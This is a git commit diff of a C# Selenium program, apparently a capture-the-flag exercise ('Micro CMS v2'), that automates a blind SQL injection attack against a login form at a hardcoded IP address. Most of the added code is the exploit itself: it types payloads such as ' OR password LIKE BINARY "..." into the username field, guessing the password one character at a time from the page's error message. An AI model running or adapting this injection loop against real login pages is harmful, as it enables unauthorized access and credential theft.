d72878f9837ce05f53b747a16c90b89f11bb8994
etienne-chrp <66628513+etienne-chrp@users.noreply.github.com>
2021-03-17 10:13:42 +0100

    Micro CSM v2 - Add Dictionary attack Selenium

--- micro-cms-v2/Program.cs
+++ micro-cms-v2/Program.cs
@@ -1,6 +1,7 @@
-using OpenQA.Selenium;
+﻿using OpenQA.Selenium;
 using OpenQA.Selenium.Chrome;
 using System;
+using System.Linq;
 
 namespace micro_cms_v2
 {
@@ -9,9 +10,39 @@ namespace micro_cms_v2
         static void Main(string[] args)
         {
             var webDriver = LaunchBrowser();
+
+            int pwdLength = 8;
+            char[] pwd = new char[pwdLength];
+            pwd = pwd.Select(x => '_').ToArray();
+            
+            int userLength = 9;
+            char[] user = new char[userLength];
+            user = user.Select(x => '_').ToArray();
+
+            // char[] dict = { '!', '"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '`', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', '~', ']', '^', '_', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~' };
+            char[] dict = { 'A', 'a', 'B', 'b', 'C', 'c', 'D', 'd', 'E', 'e', 'F', 'f', 'G', 'g', 'H', 'h', 'I', 'i', 'J', 'j', 'K', 'k', 'L', 'l', 'M', 'm', 'N', 'n', 'O', 'o', 'P', 'p', 'Q', 'q', 'R', 'r', 'S', 's', 'T', 't', 'U', 'u', 'V', 'v', 'W', 'w', 'X', 'x', 'Y', 'y', 'Z', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '!', '#', '$', '&', '(', ')', '*', '+', ',', '-', '.', '/', ':', '<', '=', '>', '?', '`', '@', '[', '\\', '~', ']', '^', '{', '|', '}', '~' };
             try
             {
-                // This is where we can start interacting with the browser
+                webDriver.Url = "http://35.227.24.107/5875953fb3/login";
+
+                for(int i = 0 ; i < pwd.Length ; i++) {
+                    foreach(var c in dict) {
+                        user[i] = c;
+                        pwd[i] = c;
+                        
+                        var input = webDriver.FindElement(By.Name("username"));
+                        // string query = $"' OR username LIKE \"{new String(user)}\";";
+                        string query = $"' OR password LIKE BINARY \"{new String(pwd)}\";";
+                        Console.WriteLine(query);
+                        input.SendKeys(query);
+                        
+                        webDriver.FindElement(By.XPath("/html/body/form/input[3]")).Click();
+
+                        if(webDriver.FindElement(By.XPath("/html/body/form/div")).Text == "Invalid password")
+                            break;
+                    }
+                }
+
             }
             catch (Exception ex)
             {
